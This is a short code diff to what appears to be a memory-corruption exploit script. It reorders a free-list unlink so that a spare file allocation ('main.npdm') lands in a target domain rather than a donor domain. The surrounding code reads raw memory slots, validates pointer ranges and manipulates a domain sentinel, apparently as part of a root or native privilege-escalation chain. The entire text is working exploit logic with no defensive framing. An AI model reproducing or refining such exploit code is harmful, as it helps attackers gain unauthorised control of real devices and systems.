@@ -807,6 +807,10 @@ async function main() {
       const slot = table + (id - 1) * 0x30;
       const b = await memory.read(slot, 0x30);
       if (ptr(b, 0x18) !== 0 || ptr(b, 0x20) !== 0) return null;
+      // Take the freed slot off the free list first: the spare file allocation
+      // would otherwise reuse the free-list head (this same slot) and the FS
+      // would put the spare in the donor domain instead of the target domain.
+      if (!await unlinkFree(slot).catch(() => false)) return null;
       const spare = await memory.request({command: 'root-native-file-spare', name: 'main.npdm'});
       const spareSlot = table + (spare.id - 1) * 0x30;
       const sb = await memory.read(spareSlot, 0x30);
@@ -815,7 +819,6 @@ async function main() {
           !(metadata >= 2 ** 32 && metadata < 2 ** 39)) return null;
       const vptr = await memory.pointer(object);
       if (!(vptr >= 2 ** 32 && vptr < 2 ** 39)) return null;
-      if (!await unlinkFree(slot).catch(() => false)) return null;
       const sentinel = Number(root.targetDomain) + 0x20;
       const sNext = await memory.pointer(sentinel);
       const updated = Buffer.from(b);
